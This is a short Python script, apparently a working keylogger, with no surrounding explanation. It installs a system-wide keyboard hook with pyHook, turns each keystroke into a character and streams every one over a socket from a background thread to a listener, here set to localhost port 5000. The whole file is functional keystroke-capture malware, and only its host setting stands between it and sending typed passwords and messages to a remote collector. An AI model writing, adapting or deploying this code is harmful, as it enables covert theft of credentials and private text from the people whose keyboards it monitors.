import queue
import socket
import threading

import pythoncom
import pyHook

q = queue.Queue()

HOST = "localhost"
PORT = 5000

def background():
    s = socket.socket()
    s.connect((HOST, PORT))
    while True:
        msg = q.get()
        s.send(msg)
sockthread = threading.Thread(target=background)
sockthread.start()

def OnKeyboardEvent(event):
    keylog = chr(event.Ascii)
    q.put(keylog.encode("utf-8"))

h_m = pyHook.HookManager()
h_m.KeyDown = OnKeyboardEvent
h_m.HookKeyboard()
pythoncom.PumpMessages()